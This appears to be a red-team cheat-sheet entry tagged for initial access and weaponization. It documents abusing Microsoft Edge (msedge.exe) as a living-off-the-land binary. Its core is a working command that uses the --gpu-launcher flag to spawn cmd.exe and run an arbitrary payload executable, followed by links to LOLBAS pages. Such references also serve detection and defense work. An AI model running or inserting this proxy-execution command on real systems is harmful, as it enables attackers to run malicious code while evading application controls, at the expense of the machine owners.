---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - T1218-015
  - windows
---
# MSedge

```
C:\> msedge.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\System32\cmd.exe /c C:\path\to\payload.exe && ping.exe -n 1 localhost"
```

---
## References

### LOLBAS

- [LOLBAS: MSedge](https://lolbas-project.github.io/lolbas/Binaries/Msedge/)

- [LOLBAS: MSedge Proxy](https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/)

- [LOLBAS: MSedgeWebView2](https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/)